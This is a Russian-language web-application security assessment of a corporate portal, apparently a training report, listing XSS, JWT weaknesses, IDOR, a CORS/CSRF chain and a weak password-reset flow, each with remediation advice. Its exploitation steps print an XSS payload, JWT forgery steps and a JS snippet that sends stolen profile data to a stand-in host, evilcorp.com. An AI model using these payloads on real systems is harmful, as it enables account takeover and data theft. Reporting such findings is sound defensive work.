Список уязвимостей обнаруженных в ходе анализа защищённости веб-приложения корпоративного портала:
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
***Тип: Stored Cross‑Site Scripting (XSS) in display_name***

**Эксплуатация:**
1. Отправляем POST запрос с полезной нагрузкой внутри JSON объекта:
```HTTP
POST /api/v1/profile HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123
Content-Type: application/json
Origin: https://portal.targetcorp.com
 
{"display_name": "<img src=x onerror=alert(document.domain)>", "bio": "Test user"}
```

2. Делаем запрос в профиль, чтобы убедиться, что нагрузка работает:
```HTTP
GET /profile/105 HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123
```
Ответ:
```HTTP
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Powered-By: Express
 
<!DOCTYPE html>
<html>
<head><title>User Profile</title></head>
<body>
 <div class="profile-card">
   <h2><img src=x onerror=alert(document.domain)></h2>
   <p class="bio">Test user</p>
   <p class="uid">User ID: 105</p>
  </div>
</body>
</html>
```

3. Определяем контекст отображения, то есть места, где мы сможем увидеть отображение display_name.
4. Подбираем payload в зависимости от места, где она будет отображаться.
5. Отправляем payload и ожидаем выполнение нагрузки.

**Риски:**
1. Session hijacking, ссесионная кука не защищена флагом HttpOnly, из-за этого можно украть cookie через JS в браузере жертвы.
2. Account takeover, в нашем ничего кроме cookies не требуется для доступа к аккаунту, злоумышленник заходит в аккаунт жертвы, меняет пароль и доступ к аккаунту потерян.
3. CSRF, через fetch можно отправить запрос на изменение состояния (поменять email, пароль и тд), тк для валидации действия используются только сессионные cookies.
4. Phishing, распространение дезинформации на сайте и другие специфические риски связанные с компанией.

**Рекомендации по устранению:**
1. Кодирование вывода. HTML-encoding для любых пользовательских данных (например, преобразование < в &lt;).
2. Белый список символов. Запретить спец символы в имени, оставить только строчные или заглавные буквы.
3. Санитизация на стороне сервера. На этапе сохранения в бд, данные нужно пронать через санитайзер (DOMPurify к примеру).
4. Content Security Policy (CSP). Настроить заголовок, запрещающий выполнение инлайн скриптов и сделать ограничение на источники скриптов.
5. Добавить флаги. Установить HttpOnly и Secure, чтобы нельзя было получить cookies через JS.

***Тип: Weak JSON Web Token (JWT)***

**Эксплуатация:**
1. Декодируем JWT токен, чтобы извлечь header и payload.
Header:
```JSON
{
  "alg": "HS256"
}
```
Payload:
```JSON
{
  "uid": 105,
  "username": "attacker",
  "role": "user"
}
```
2. После декодирования используем сторонние инструменты (hashcat), чтобы перебрать слабые ключи для подписи HS256.
3. Если сервер поддерживает "none" алгоритм/не может подтвердить алгоритм, то создать токен без подписи. (Точно сказать из запросов нельзя, есть ли такое поведение, но посчитала важным упомянуть, чтобы лишний раз не подписывать токен)
4. Заменяем поля в JWT токене: {"uid": 1, "username": "admin", "role": "admin"}. Подписываем его и получаем доступ к аккаунту жертвы.

**Риски:**
1. Account takeover, ничего кроме токена не требуется для доступа к аккаунту, то мы можем получить доступ к любому аккаунту на платформе. (В данном случае, к аккаунту админа)

**Рекомендации по устранению:**
1. Качественный ключ. Использовать случайный и длинный ключ, чтобы его было невозможно перебрать (не меннее 256 бит).
2. Если возможно, заменить на асимметричный алгоритм шифрования, чтобы нельзя было подписать токен самостоятельно (не зная приватный ключ, который хранится на сервере).
3. Валидация алгоритма. Принимать только ожидаемый алгоритм, остальные отклонять.
4. Добавить время жизни токена, чтобы минимизировать период пребывания злоумышленника на аккаунте.

***Тип: Insecure Direct Object Reference (IDOR)***

**Эксплуатация:**
1. С любым валидным токеном обращаемся к uid 1, 2, 3 ... (uid других пользователей):
(тут обращаюсь от пользователя с uid 105)
```HTTP
GET /api/v1/profile/1 HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123
```
Ответ: (получили информацию о пользователе с uid 1)
```HTTP
HTTP/1.1 200 OK
Content-Type: application/json
 
{"uid": 1, "username": "admin", "email": "admin@targetcorp.com",
 "role": "administrator", "display_name": "Admin User",
 "last_login": "2025-03-15T10:30:00Z"}
 ```
 2. Сервер обрабатывает запрос, предоставляя информацию о любом пользователе в системе.

**Риски:**
1. Раскрытие чувствительной информации о всех пользователях, утечка данных. (можно узнать о любом пользователе: uid, username, email, role, display_name, last_login)

**Рекомендации по устранению:**
1. Добавить проверку авторизации, желательно чтобы пользователь видел /api/v1/profile/me (без прямого указания uid) или сервер должен проверять, имеет ли пользователь доступ к аккаунту с определенным uid.
2. Использовать неочевидные идентификаторы, чтобы усложнить перебор (можно использовать uuid)

***Тип: Insecure CORS Configuration приводит к CSRF в endpoint /api/v1/account/change-email.***

**Эксплуатация:**
1. Отправляем запрос с заголовком Origin: https://evilcorp.com. Видим, что произвольный Origin отражается в ответе.
2. Размешаем на стороннем сайте скрипт для изменения учетных данных:
```JS
fetch('https://portal.targetcorp.com/api/v1/profile/1', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    fetch('https://evilcorp.com/collect?data=' + encodeURIComponent(JSON.stringify(data)));
});
```
3. Отправляем запрос для подтверждения:
```HTTP
POST /api/v1/account/change-email HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123
Content-Type: application/x-www-form-urlencoded
Origin: https://evilcorp.com
Referer: https://evilcorp.com/csrf.html
 
new_email=hacked@email.com
```

Ответ:
```HTTP
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://evilcorp.com
Access-Control-Allow-Credentials: true
 
{"status": "ok", "message": "Email changed to hacked@email.com"}
```
4. Аутентифицированная жертва посещает evilcorp.com, браузер отправляет запрос на /api/v1/profile/1 и автоматически прикрепляет cookies.
5. Сервер возвращает данные профиля, а злоумышленник получает конфиденциальную информацию.

**Риски:**
1. Любой API‑эндпоинт, возвращающий конфиденциальные данные (например, GET /api/v1/profile/1), доступен через fetch с credentials: 'include', можно украсть личные данные пользователей, включая email администратора, роль, время последнего входа и т. д. Это усиливает IDOR‑уязвимость, описанную выше.
2. Account takeover, злоумышленник может изменить email жертвы на свой, а затем инициировать сброс пароля (как мы видим в запросе 5) и доступ к аккаунту бужет потерян.

**Рекомендации по устранению:**
1. Использовать CSRF токен. Генерировать на серверной стороне уникальный токен и привязывать его к сессии любого пользователя, такой токен должен прикрепляться к любому запросу, который изменяет состояние.
2. Белый список для заголовков. Проверять заголовки Origin и Refer на сервере.
3. Не отражать Origin, если запрос содержит учетные данные. Для всех авторизованных запросов Origin должен быть фиксированным или сверяться с белым списком.
3. Установить SameSite=Strict (Lax) или использовать сложный Content-Type (application/json как на /api/v1/profile endpoint). Первое не даст сессионным данным отправляться с произвольного сайта. Второе гарантирует PreFlight запрос, что при правильной настройке CORS, не даст отправить запрос с сторонней Origin.

Дополнительные рекомендации:

***Тип: Information Disclosure через X-Powered-By***

**Эксплуатация:**
1. Отправить запрос на endpoint /profile/105:
```HTTP
GET /profile/105 HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123
```

Ответ:
```HTTP
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Powered-By: Express
 
<!DOCTYPE html>
<html>
<head><title>User Profile</title></head>
<body>
 <div class="profile-card">
   <h2><img src=x onerror=alert(document.domain)></h2>
   <p class="bio">Test user</p>
   <p class="uid">User ID: 105</p>
  </div>
</body>
</html>
```

**Риски:**
1. Само по себе не уявляется уязвимостью, но дополнительная информация помогает атакующим лучше понять стек приложения. Зная версию/технологии можно найти специфические CVEs или мисконфигурации, что увеличивает площать атаки.

**Рекомендации по устранению:**
1. Отключить header X-Powered-By: в продакш версии приложения. А также любые другие headers, которые раскрывают дополнительную информацию о приложении.

***Тип: Weak Password Reset Flow***

**Эксплуатация:**
1. Уже есть подтвержденная CSRF уязвимость, злоумышленнику остается сменить пароль и аккаунт останется у него навсегда.
2. После смены email через CSRF, запросить сброс пароля:
```HTTP
POST /api/v1/account/reset-password HTTP/1.1
Host: portal.targetcorp.com
Content-Type: application/json
 
{"email": "hacked@mail.com"}
```

Ответ:
```HTTP
HTTP/1.1 200 OK
Content-Type: application/json
 
{"status": "ok", "message": "Password reset link sent to hacked@mail.com"}
```
3. Завершение цепочки для полного захвата аккаунта, злоумышленник успешно сменил пароль и email на аккаунте жертвы.

**Риски:**
1. Account takeover, злоумышленник может изменить email жертвы на свой, а затем инициировать сброс пароля без дополнительных подтверждений и доступ к аккаунту будет утерян.

**Рекомендации по устранению:**
1. Отправлять ссылку на сброс пароля на старый адрес, либо требовать текущий пароль при установке нового.
